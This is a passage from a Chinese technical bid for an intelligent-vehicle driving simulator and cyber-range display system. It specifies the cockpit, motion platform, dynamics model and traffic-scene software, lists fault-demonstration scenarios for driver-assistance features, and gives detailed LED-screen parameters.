运动平台：</p><p>功能参数如下：智能驾驶座舱配备了运动平台，能够模拟车辆在行驶过程中的运动感觉。</p><p>功能参数如下：运动平台可以根据车辆的加速、制动和转向等操作提供相应的运动效果，使驾驶者更加身临其境地感受到驾驶的乐趣和真实性。</p><p>通过以上功能，智能驾驶座舱方案能够提供驾驶者所需的反力装置、动力学模型、影像系统、仪表盘、操作台和运动平台等功能。驾驶者可以通过仪表盘清晰地查看车辆的关键信息，使用操作台进行各项操作，并通过反力装置和运动平台获得逼真的驾驶感觉。这将提升驾驶者的驾驶体验，增强驾驶者的感知和控制能力，从而实现更安全、舒适和智能化的驾驶环境。</p><h2 id="产品功能参数："><a href="#产品功能参数：" class="headerlink" title="产品功能参数："></a>产品功能参数：</h2><h3 id="驾驶舱"><a href="#驾驶舱" class="headerlink" title="驾驶舱"></a>驾驶舱</h3><p>功能参数如下：</p><ol><li>仪表盘和操作台应采用Glass Cockpit概念的图形仪表盘和操作板。可以显示适用的图形仪表盘及中央仪表板GUI。 仪表盘UI采用LCD显示器,使无人驾驶车辆的体现和数字信息的显示、多种集群设计的体现不受限制；</li><li>仪表显示屏至少10寸，分辨率720P以上，对比度700:1,12V直流供电；</li><li>仪表显示内容包含速度、转速、温度/警告、发动机/电池故障、驾驶信息、AVN信息。</li></ol><p>方案响应如下：</p><p>模拟座舱由接近实车的驾驶室、电路控制等组成。模拟座舱是本系统的关键设备之一，采用通用驾驶舱，操作件除变速器外都采用原车件。座舱为全功能模拟座舱，操作感与实车的相似性是本项目的关键所在，具有噪声小、无污染、能耗低和便于安装、维修等优点，基本结构如下：</p><p>1）座舱基本框架包括驾驶室、仪表、座椅、上下支架等；</p><p>2）转向机构总成</p><p>转向机构总成是用于控制模拟汽车行驶方向和传递模拟路面反馈力的装置。它由实车件（方向盘、点火开关、组合开关、护罩）、电动反力矩伺服系统组成，方向盘选用原车配件，安装位置和尺寸与被模拟的特定车辆相同，如所示。电动反力矩伺服系统转动过程中，方向盘能产生与真车相符的转动阻力，在相应场景中能出现对应的阻尼力与抖动力。</p><p>3）变速器总成</p><p>变速器总成是用于改变模拟汽车行驶速度和倒车的装置，它由变速器、挡位传感器、电子离合装置等组成。模拟实车解放 1125 变速杆设计，用于模拟不同车型的挡位设置，根据车型选择的变化，呈现不同挡位。</p><p>电子离合装置是用于控制离合器踏板与变速器锁止机构的装置，可实现受离合器踏板控制的变速器挡位锁止功能，不踏下离合器踏板无法移动变速杆。</p><p>4）踏板组总成</p><p>踏板组总成结构见图所示，根据图示踏板包括踏板信号反馈板 1、上支架 2、磁铁座 4、磁铁 5、脚踏板 6、固定板 8、下支架 9、下活动管 10、上活动管 11、弹簧 12 和踏板连杆 13。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/545c261df6124eda53584a03d523a06d.jpeg"></p><p>5）驾驶室面板</p><p>驾驶室面板包括仪表和开关，分别用液晶显示屏和触摸屏输出和输入。虚拟模拟仪表能实时指示或显示被模拟的实装运行参数，符合实装上真</p><p>实仪表的动态与静态性能指标，表盘结构与指示和真实仪表一致。</p><p>6）测控系统部件</p><p>测控系统部件主要用于通过软件调用测定与驾驶有关的各操作部件的状态和数据，包括离合器、脚制动、油门、变速器、方向盘、手制动、手操作触摸屏等各种操作状态数据。根据不同操作采集的数据特性不同，采取不同的传感器进行采集。其中离合器、脚制动、油门、手制动可利用电位器获取某一操作的角度变化量。采用角传感器获取方向盘的角度转动量；变速器采用开关量确定所处的挡位；手与触摸屏空间关系位置使用红外光学定位。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c93291dccee677bc9c49869c4c6977bb.png"></p><p>7）离合器踏板、脚制动踏板、加速踏板及扩展部件和手制动；</p><p>8）仪表盘和操作台应采用Glass Cockpit概念的图形仪表盘和操作板。可以显示适用的图形仪表盘及中央仪表板GUI。 仪表盘UI采用LCD显示器,使无人驾驶车辆的体现和数字信息的显示、多种集群设计的体现不受限制；</p><p>9）仪表显示屏至少10寸，分辨率720P以上，对比度700:1,12V直流供电；</p><p>10）仪表显示内容包含速度、转速、温度/警告、发动机/电池故障、驾驶信息、AVN信息。</p><h3 id="运动平台"><a href="#运动平台" class="headerlink" title="运动平台"></a>运动平台</h3><p>功能参数如下：</p><ol><li>支持3自由度；</li><li>支持俯仰、滚转、上下平移；</li><li>俯仰最大行程不低于正负5 deg，运动速度不低于15 deg/s；</li><li>滚转最大行程不低于正负5 deg, 运动速度不低于20 deg/s；</li><li>上下平移最大形成不低于正负0.07 m,运动速度不低于0.2 m/s；</li><li>负载300kg；</li><li>配备紧急停止按钮。</li></ol><p>三自由度平台系统由 Stewart 机构的三自由度运动平台、计算机控制系统、驱动系统等组成。下平台安装在地面的固定基座基上，上平台为支撑平台。计算机控制系统通过协调控制电动缸的行程，实现运动平台的三个自由度的运动。</p><table><thead><tr><th><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6b06456983b3cdad5bef7e6262ab1522.png"></th></tr></thead></table><p>1)上下运动平台：上平台，连接需要被模拟动作的机构。上铰链，双回转轴的虎克铰结构， 用于连接上平台与电动缸的活塞杆。下铰链，单虎克铰结构，用于连接固定基座与电动缸的 筒体。下平台可安装固定基座。 2）计算机控制系统硬件：运动控制计算机（伺服控制单元）：实现平台系统启动/停止、接 收上位机发来的位姿控制信息、对电动缸进行运动控制、监控伺服电机驱动器的工作状态、 监控系统的运动状态、完成故障处理以及安全保护工作。 3）信号调理单元：完成与平台系统运动状态相关的各种传感器信号、测试信号和数字 I/O 信号的调理，以及伺服驱动器的驱动等。</p><table><thead><tr><th>电动缸参数 电动缸型号</th><th>ECE020-XXX</th><th>备注</th></tr></thead><tbody><tr><td>类型</td><td>折返式</td><td></td></tr><tr><td>图号</td><td>NC200225-1/226-1</td><td></td></tr><tr><td>丝杆直径*导程（mm）</td><td>16×5</td><td></td></tr><tr><td>有效行程（mm）</td><td>100</td><td></td></tr><tr><td>最大行程（mm）</td><td>100</td><td></td></tr><tr><td>额定出力（KN）</td><td>3.8</td><td></td></tr><tr><td>额定速度（mm/sec）</td><td>166</td><td></td></tr><tr><td>电机功率（KW）</td><td>0.4</td><td></td></tr><tr><td>电机额定转速（rpm）</td><td>3000</td><td></td></tr><tr><td>减速比</td><td>1.5:1</td><td></td></tr><tr><td>内部防转机构</td><td>无</td><td></td></tr><tr><td>纵倾</td><td>位移：±4°；速度：±15°/s；加速度：±15°/s 2</td><td>。</td></tr><tr><td>横倾</td><td>位移：±4°；速度：±15°/s；加速度：±15°/s 2</td><td>。</td></tr><tr><td>垂荡</td><td>位移：±60mm；速度：0-0.3m/s；加速度：0.15g。</td><td></td></tr><tr><td>重复定位精度（mm）</td><td>≤±0.05</td><td></td></tr><tr><td>安装方式</td><td>尾铰+杆端十字铰</td><td></td></tr><tr><td>限位开关</td><td>有</td><td>2 个 NPN 常闭</td></tr><tr><td>工作环境温度</td><td>常温</td><td></td></tr><tr><td>电动缸润滑方式</td><td>润滑脂</td><td></td></tr><tr><td>类型</td><td>折返式</td><td></td></tr><tr><td>图号</td><td>NC200225-1/226-1</td><td></td></tr></tbody></table><h3 id="车辆动力学模型"><a href="#车辆动力学模型" class="headerlink" title="车辆动力学模型"></a>车辆动力学模型</h3><p>功能参数如下：</p><ol><li>模型能够支持和实现车辆动力学主要模块。</li><li>实现模型、数据、仿真和结果的管理；</li><li>内嵌自动化测试工具和脚本工具（支持前处理和后处理）；</li><li>支持根据车辆模型的运动方程，利用三维刚体的线运动量和角运动量，选取所需自由度的车辆模型，建立运动方程，开发基于多体动力学的车辆模型；</li><li>支持根据模块分别开发悬架装置、轮胎、转向、防滑杆等底盘构成组件。</li></ol><p>方案构建了一个全面的、经过精确校验的车辆动力学模型，能够精准模拟车辆在不同工况下的动态行为。应用一种创新的场景软件和项目管理工具，为您提供了全方位的模型、数据、仿真和结果管理功能。软件特有的内嵌自动化测试工具和脚本工具。在车辆模型的运动方程方面，采用了独特的三维刚体线运动量和角运动量方法，能够选取特定自由度的车辆模型和建立相应的运动方程。</p><p>该模型不仅支持实现车辆动力学的核心模块，还能确保各模块间的协同工作，模拟车辆的实际动态行为，为研究和开发提供坚实基础。</p><p>该系统不仅实现了模型、数据、仿真和结果的有效管理，还提供了一套完善的解决方案，以确保整个仿真过程的顺畅和数据的准确性。</p><p>系统内嵌了自动化测试工具和脚本工具，这些工具支持仿真的前处理和后处理步骤，简化了测试流程，提高了工作效率和准确度。</p><p>该系统支持基于车辆模型的运动方程开发，可以根据三维刚体的线运动量和角运动量，选取所需自由度，精确建立运动方程，进而开发出精确的多体动力学车辆模型。</p><p>同时，也支持开发车辆底盘的关键组件，如悬架装置、轮胎、转向系统和防滑杆等。</p><h3 id="影像系统"><a href="#影像系统" class="headerlink" title="影像系统"></a>影像系统</h3><p>功能参数如下：</p><ol><li>显示系统正面应采用大于1200毫米X 700毫米、侧面大于820毫米X 600毫米的尺寸和分辨率Full HD以上的显示器；</li><li>音响系统支持展示行车过程中的各类声音，应采用5.1CH，输出功率不低于90w；</li><li>主控PC的CPU13代i7，内存16G DDR4，显卡GTX4060，硬盘500G SSD，标配Win10以上操作系统。</li></ol><p>响应方案：</p><p>主屏采用49英寸带鱼屏（1193.62mm x 369mm）。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c0ee8b314a9a82ae7adff640eb618cb0.png" alt="1702793802991"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f029d9f06738a8849feeb10661020f5a.png" alt="1702794226185"></p><table><thead><tr><th>产品型号 XG49WCR</th><th>分辨率5120x1440</th></tr></thead><tbody><tr><td>刷新率165Hz</td><td>响应时间1ms MPRT</td></tr><tr><td>亮度 550cd/m2</td><td>HDR HDR400</td></tr><tr><td>色域 120%SRGB</td><td>PBP/PIP支持多信号输入</td></tr><tr><td>屏幕尺寸49英寸</td><td>比例 32:9</td></tr><tr><td>屏幕类型1800R</td><td>色数 10bit</td></tr><tr><td>色准AE&lt;2</td><td>画面同步Adaptive-sync</td></tr><tr><td>信号线：原装DP线、HDMI线、TYPE-C线</td><td></td></tr><tr><td>接口：HDMI2.0,DP1.4,USB3.0x3,90w Type-C,耳机插孔</td><td></td></tr></tbody></table><p>音响系统支持展示行车过程中的各类声音，应采用5.1CH，输出功率高于90w；</p><p>主控PC的CPU为13代i7，内存16G DDR4，显卡GTX4060，硬盘500G SSD，标配Win10以上操作系统。</p><h3 id="道路交通场景仿真软件"><a href="#道路交通场景仿真软件" class="headerlink" title="道路交通场景仿真软件"></a>道路交通场景仿真软件</h3><p>配置参数要求如下：</p><ol><li>软件的开放性好，采用业内认可程度高、通用性强和开放性好的标准；</li><li>能够快速构建仿真道路；</li><li>支持复杂路网快速建模，包含复杂不规则路口，横纵向起伏，交通标识与信号灯；</li><li>可以设置不同道路形态的模型，包括多车道、交叉路口、环岛、道路出口/入口、坡道、匝道、立交桥、污损等；</li><li>支持雨雪雾天气条件和白天夜晚光线条件下的环境仿真；</li><li>具备交通工况仿真能力，交通参与方涵盖轿车、SUV、卡车、摩托车、行人、动物等，并具备时间/事件出发能力；</li><li>支持理想超声波、毫米波、摄像头、激光雷达传感器模型仿真；</li><li>支持实时物理级复杂摄像头和激光雷达传感器模型的仿真；</li><li>支持录制与回放功能。</li></ol><p>本系统的仿真场景，可以实现对于仿真场景、天气、交通流等要素的灵活编辑，根据项目需求进行仿真场景的定制化开发。</p><p>基于场景软件开发完整的仿真道路场景，自动高效的交通场景仿真，包含全面的交通场景仿真软件套件，包含实时车辆模型开发、实时动画软件开发、虚拟驾驶环境开发，可实现不同形式的研究需要。</p><table><thead><tr><th><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e5257f1f26b003435448873e733266fc.png" alt="公路上的汽车 描述已自动生成"></th></tr></thead></table><p>仿真场景中将设置典型的交通标志牌和信号灯，并为信号灯设置与场景匹配的规则，提升场景的真实度和沉浸感。</p><table><thead><tr><th><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/86bb4efb84370ccad6cc3f73887e172f.jpeg" alt="夜晚的马路上 描述已自动生成"></th></tr></thead></table><p>虚拟仿真场景中有不同的环境配置，包括白天与黑夜，晴天与阴天，以及雨雪等极端天气，可以在控制器中选择和切换。道路场景中可以根据需求加入不同的交通状态，如拥堵交通流，超车车辆等，模拟车辆在道路上遇到的不同情况。此外，场景中设置由AI控制的行人，行人可以根据车辆行为做出不同的行为，如躲避，确认车辆停稳后过马路等。</p><table><thead><tr><th><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/129100af857741fe7afd2b7034d79698.png" alt="人在路上行驶的汽车 中度可信度描述已自动生成"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/17903e6be76d0dd7d7672f57e26acbe6.png" alt="公路上有许多车 描述已自动生成"></th></tr></thead></table><h3 id="自动驾驶攻防演示场景"><a href="#自动驾驶攻防演示场景" class="headerlink" title="自动驾驶攻防演示场景"></a>自动驾驶攻防演示场景</h3><ol><li>支持SUA场景的攻防：意外加速<ol><li>自适应巡航ACC利用国道自动驾驶；</li><li>车辆突然加速到设定速度以上；</li><li>ACC不可以解除，与前车追尾。</li></ol></li><li>支持LKA场景的攻防：车道保持辅助功能故障<ol><li>使用车道保持辅助装置自动驾驶；</li><li>车道保持辅助装置故障，导致车辆驶入侧车道；</li><li>与左侧车道车辆发生追尾。</li></ol></li><li>支持AEB场景的攻防：自主紧急制动失效<ol><li>利用ACC的高速公路自动驾驶；</li><li>制动出现异常信号，车辆突然制动；</li><li>被后车追尾。</li></ol></li><li>支持TSR场景的攻防：交通标志识别故障<ol><li>利用ACC的高速公路自动驾驶；</li><li>交通标志（限速标志）识别故障，导致超速行驶；</li><li>未确保ACC安全制动距离，与前车相撞。</li></ol></li><li>支持EO场景的攻防；发动机意外熄火<ol><li>驾驶员在市内道路上行驶；</li><li>当进入交叉口是，发动机意外熄火；</li><li>无法重新启动，导致追尾事故。</li></ol></li><li>支持EOC场景的攻防：油门故障<ol><li>驾驶员在高速公路上行驶；</li><li>在直行加速区域行驶中，由于油门故障无法加速反而减速；</li><li>导致与后方车辆发生追尾事故。</li></ol></li><li>支持EB场景的攻防：制动失效<ol><li>驾驶员在国道上行驶；</li><li>进入紧急弯道区域；</li><li>因制动故障，无法控制车速，导致车道偏离。</li></ol></li><li>支持IHBC场景的攻防：智能远光灯控制故障<ol><li>驾驶员在国道上行驶；</li><li>进入急转弯车道区域；</li><li>自动变换近光灯和远光灯，无法辨别车道，导致偏离车道。</li></ol></li></ol><p>响应方案如下：</p><p>为验证自动驾驶的安全性与可靠性，本方案搭建一套基于沙盘的自动驾驶演示场景，演示步骤为：</p><p>1. 环境搭建：准备一个沙盘模型，代表一个道路网络和周围环境。使用合适的比例和细节来模拟真实的道路情况，包括车道、交叉口、路标、交通信号灯等。</p><p>2. 车辆模拟：选择一个或多个自动驾驶车辆模型，并放置在沙盘上。确保车辆模型与实际车辆的尺寸和特征相匹配。</p><p>3. 传感器模拟：为车辆模型添加传感器模拟器，模拟自动驾驶车辆常用的传感器，如摄像头、激光雷达、雷达等。这些传感器将用于感知周围环境并获取数据。</p><p>4. 自动驾驶算法：为车辆模型加载自动驾驶算法，模拟车辆的决策和控制过程。这些算法可以是预先定义的规则或基于机器学习的模型。</p><p>5. 演示场景设计：设计一个或多个自动驾驶场景，例如道路变道、交叉口通行、避障等。确保场景具有挑战性，并涵盖不同的交通情况和道路条件。</p><p>6. 演示执行：在沙盘上执行自动驾驶演示，模拟车辆的行为和决策过程。观察车辆如何感知环境、做出决策并执行动作。</p><p>7. 故障模拟：模拟自动驾驶系统的故障情况，例如传感器故障、算法错误等。观察系统如何处理故障情况，并评估其容错性和安全性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/90f07c0898cdc2c9066333c79da5d6c4.png"></p><h1 id="智能汽车网络靶场攻防演练大屏系统"><a href="#智能汽车网络靶场攻防演练大屏系统" class="headerlink" title="智能汽车网络靶场攻防演练大屏系统"></a>智能汽车网络靶场攻防演练大屏系统</h1><h2 id="总体概述-4"><a href="#总体概述-4" class="headerlink" title="总体概述"></a>总体概述</h2><p>网络靶场攻防演练大屏采用山东泰克COB倒装LED大屏，COB（Chip-on-Board）倒装展示大屏是一种创新的显示技术，它采用了先进的封装技术和倒装工艺，将LED芯片直接封装在显示屏背板上，实现了更高的像素密度和更广泛的视角范围。以下是对COB倒装展示大屏的描述：</p><p>COB倒装展示大屏以其卓越的视觉效果和出色的可靠性而备受关注。它的独特设计使得LED芯片直接连接到显示屏背板上，消除了传统封装中的导线和基板，大大提高了像素密度和显示效果。</p><p>COB倒装展示大屏具有出色的色彩表现力和高对比度，能够呈现出鲜艳、细腻的图像和视频内容。其高亮度和广阔的视角范围，使得观众无论从任何角度观看，都能享受到清晰、逼真的视觉体验。</p><p>此外，COB倒装展示大屏的倒装工艺使得LED芯片与显示屏背板紧密结合，有效提高了屏幕的抗震性和抗冲击性能。这种设计还能有效降低能耗，提高屏幕的可靠性和稳定性，延长使用寿命。</p><p>COB倒装展示大屏广泛应用于室内和室外场所，如商业广告牌、体育场馆、会议中心等。其灵活的模块化设计，使得大屏可以根据实际需求进行自由组合和拼接，实现各种尺寸和形状的显示效果。</p><p>总之，COB倒装展示大屏以其卓越的视觉效果、高可靠性和灵活性，成为现代显示技术中的重要创新。它为各种场合提供了出色的视觉展示解决方案，为观众带来震撼人心的视觉享受。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/24f420b5d6c6da54ce65187de74455b4.png"></p><p>智能汽车网络靶场攻防演练大屏系统具备以下能力：为汽车网络靶场运行提供高清、实时、直观的仿真验证、测试、竞赛、演练及安全运营可视化基础设施。</p><p>智能汽车网络靶场攻防演练大屏系统包含全彩LED显示屏、电源、控制电脑、数据运算分布器、信号射频识别融合器、信号映射影音终端、网络数据防御平台、配电柜、机柜、线阵列音柱、多功能商用功率放大器、无线手持话筒、音频处理器、调音台、配套辅材。</p><h3 id="全彩LED显示屏"><a href="#全彩LED显示屏" class="headerlink" title="全彩LED显示屏"></a>全彩LED显示屏</h3><h4 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h4><p>全彩LED显示屏采用山东泰克的COB007型 显示屏，该屏采用了先进的封装技术和倒装工艺，将LED芯片直接封装在显示屏背板上，实现了更高的像素密度和更广泛的视角范围。技术实现方式如下：</p><ul><li>COB封装技术：COB封装技术是一种将LED芯片直接封装在显示屏背板上的技术。在COB封装中，LED芯片通过微焊接技术直接连接到显示屏背板上的金属线路上，而不需要传统封装中的导线和基板。这种直接封装的方式使得LED芯片与显示屏背板之间的距离非常接近，实现了更高的像素密度和更广泛的视角范围。</li><li>倒装工艺：COB倒装显示屏采用倒装工艺，即将LED芯片倒装到显示屏背板上。在倒装过程中，首先将LED芯片通过微焊接技术连接到显示屏背板上的金属线路上。然后，将LED芯片倒置放置在显示屏背板上，使其正面朝下。这种倒装的方式可以有效减小LED芯片与观察者之间的距离，提高观看效果。</li><li>像素密度提高：由于COB倒装显示屏采用了直接封装和倒装工艺，LED芯片与显示屏背板之间的距离非常接近，从而实现了更高的像素密度。LED芯片之间的间距更小，可以在有限的显示区域内容纳更多的LED芯片，使得显示屏的分辨率更高，图像更细腻</li><li>视角范围扩大：COB倒装显示屏的倒装工艺使得LED芯片正面直接暴露在外，而不需要传统封装中的透光胶体。这样一来，观察者可以从更广阔的角度观看显示屏，而不会出现颜色变化或亮度降低的情况。COB倒装显示屏具有更广泛的视角范围，使得观众无论从哪个角度观看，都能获得清晰、逼真的视觉效果。</li></ul><h4 id="产品参数"><a href="#产品参数" class="headerlink" title="产品参数"></a>产品参数</h4><p>品牌：山东泰克，型号：COB007</p><ol><li>像素点间距:0.793mm, 像素密度1587203Pixels/m2；我司提供提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件并加盖生产制造商的公章；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d562593efba3ac3679428a2006c91f3d.png"></p><ol><li>单元箱体尺寸：宽609.6mm，高342.9mm，采用超薄压铸铝16：9比例箱体设计；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d562593efba3ac3679428a2006c91f3d.png"></p><ol><li>箱体平整度≤0.1mm，相邻箱体之间的平整度≤0.1mm；我司提供提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件并加盖生产制造商的公章。复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bbdeefe32c6831c8b17f4ed43d78db96.png"></p><ol><li>为保证客户的大屏使用，满足日常和项目的要求，我司提供宽15.8m，高3m，尺寸偏差(宽和高)小于正负1%的LED显示屏，显示面积47.4㎡，根据实际安装情况，我司保证面积偏差小于正负3%，我司提供的屏幕分辨率为16640点*3240点，以确保显示清晰；</li><li>白平衡亮度（亮度调节范围)：0-2000cd/m2，亮度均匀性97%；我司提供提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件并加盖生产制造商的公章。复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e2e24fafa76ac6bb1138c1414af7ba0a.png"></p><ol><li>静态对比度20000:1；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3815053c136d65c0cd96fb4bb962e0de.png"></p><ol><li>显示屏水平/垂直视角：172°；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3815053c136d65c0cd96fb4bb962e0de.png"></p><ol><li>色温：1000K-18000K可调，调节步长任意设置，可设置为100K，满足色温为6500K时，100%、75%、50%、25%四档电平白场调节色温误差300K；色域覆盖率：140%sRGB，115%NTSC，105%AdobeRGB，105%DCI-P3，80%BT2020；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/62575abee556d7844f82e0577e8260cb.png"></p><ol><li>刷新频率3840Hz；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3815053c136d65c0cd96fb4bb962e0de.png"></p><ol><li>可消除95%以上的拍摄摩尔纹现象(特定环境下可100%消除)，有效降低光强辐射，抑制摩尔纹；具有校正技术，可消除LED单元拼装造成的亮、暗线；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/110864a71fb7c3d6cd3f67ca925a90d1.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7451a8b199ec2bdd1c34dcd68ab346db.png"></p><ol><li>具有高密集成光学设计技术和哑光涂层技术，有效消除眩光；正常工作时显示画面无伪轮廓现象，无重影和拖尾现象，无几何失真和非线性失真；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f57ce6d2abd241026e52e23b2d4aebaf.png"></p><ol><li><p>我司提供的该显示屏具有手动、自动调节亮度功能，并具备节能模式、常规模式、高亮模式：还能随环境亮度变化自动调节，可根据使用需求任意调节显示亮度模式，有效降低功耗更加节能，避免光污染；</p></li><li><p>灰度调节65536级，支持65536灰阶每一级灰度进行精准检测与控制，解决灰阶过渡偏色反跳等问题，使灰阶过渡更加细腻；同时支持分段校正，提升各个灰阶的显示均匀性；复印件见“CNAS检测报告”部分。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/852100aa031f2e250ade002ac21833b4.png"></p></li><li><p>显示面为树脂一次性整体灌封的平面封装，无点状、面状及凸点造型，无像素独立、二次灌封，非喷涂工艺，表面碰撞或摩擦不脱落；墨色一致性（色准)∆E＜0.5，表面光泽度30GU，屏幕表面黑度30；复印件见“CNAS检测报告”部分。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/25fb8274a103b876f67341f13ef1375d.png"></p><ol><li>我司提供的显示屏具备低亮高灰处理技术，可保证显示画面的灰度不因低亮而损失；</li><li>我司提供的显示屏的输入信号、高动态范围、色域覆盖率、峰值亮度、黑色亮度、动态范围均符合TIRT-GK-JS-77-2022《室内LED显示终端HDR特性认证技术规范》高动态显示HDR3.0版测试标准要求，可应对各种环境和观看角度。同时，该显示屏还能支持显示更多的动态范围，保证EOTF曲线拟合度在0.7-1.3区间；</li><li>峰值功耗583W/m2，平均功耗188W/m2，休眠模式带电黑屏功耗30W/m2；支持智能（黑屏）节电功能，开启智能节电功能比没有开启节能45%以上；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/17b55b0422f70db0919e46d6402a7540.png"></p><ol><li>平均无故障时间MTBF≥100000小时，平均修复时间MTTR＜5分钟；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/98c5f1fcfb7f1914e45e0b65396f6658.png"></p><ol><li>蓝光危害辐亮度为7.0x10-1W/(m2*sr)，符合无危害标准（即蓝光危害辐亮度≤1W/m2/sr)。近紫外危害幅度达到无危害要求；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/59878ed624a5dac81212a5c3a8108df0.png"></p><ol><li>LED发光芯片焊接强度：可承受横向推力≥70g；</li><li>表面硬度：满足HRC 8级和3H硬度；我司提供提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件并加盖生产制造商的公章。复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4a64b8e167670fe1382cc3fd230519c6.png"></p><ol><li>我司提供的显示大屏支持分布上电功能，可进行有序上电，进而避免开机瞬间电流过大，损坏设备，起到保护供电系统安全的作用。该显示屏还支持自动过流和电压监测功能和自动温度监测功能，可以有效保护系统电路安全。在抗电强度方面能实现一次电路与机身（可触及金属部件）之间施加1500V电压，并且无击穿或者放电现象；</li><li>为确保显示屏具备较高防护与安全性能，显示屏防护等级达到IP65；我司提供提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件并加盖生产制造商的公章。复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/98bc6b4a13816805466fc32318753fad.png"></p><ol><li>我司提供的显示屏支持DP/HDMI/DVI/SDI、光纤等多种信号源方式信号输入，支分辨率为4096*2160@60Hz并向下兼容。信号传输还能通过RJ45及光纤进行，RJ45传输距离120m,光纤传输距离可达10km；</li><li>低噪声：屏体球面半径1米处，整屏噪声≤5db；复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9ab19c321ed74306be69f97672150840.png"></p><ol><li>该屏幕温度控制：工作环境温度≤30℃，在进行显示全白场景时，≥500cd/m2使用时，显示屏表面温度不超过40℃；复印件见“CNAS检测报告”部分。</li><li>该显示屏支持防电力远程窃密技术，提供的通信接口包含RS232接口1个。为了更好的阻止电力通信，采用了更加科学的信息相关技术方式阻止电力通信，覆盖范围1KHz~1.5GHz，输入/输出电源滤波没计抑制信号强度，具备良好的电磁兼容性。</li><li>维护方式：提供前维护式。复印件见“CNAS检测报告”部分。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8a26cd2bcc1b25bfee2f0771b2368bc5.png"></p><h4 id="证明材料"><a href="#证明材料" class="headerlink" title="证明材料"></a>证明材料</h4><h5 id="CNAS检测报告"><a href="#CNAS检测报告" class="headerlink" title="CNAS检测报告"></a>CNAS检测报告</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/025866712a33a1a44501f87ff349bdfc.jpeg" alt="新建 DOCX 文档(OCR)_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e9c560f35745400290ac9e81e5e6183a.jpeg" alt="新建 DOCX 文档(OCR)_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1b619727afe0ce10c67367cfec8161b8.jpeg" alt="新建 DOCX 文档(OCR)_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0d4bdb0e25249fdb555195c95a7fa96f.jpeg" alt="新建 DOCX 文档(OCR)_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/80fa2edf502379c1ffd29ee92a80bb65.jpeg" alt="新建 DOCX 文档(OCR)_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4702efaa8f2bbc6cdf27e1dd4b40bb62.jpeg" alt="新建 DOCX 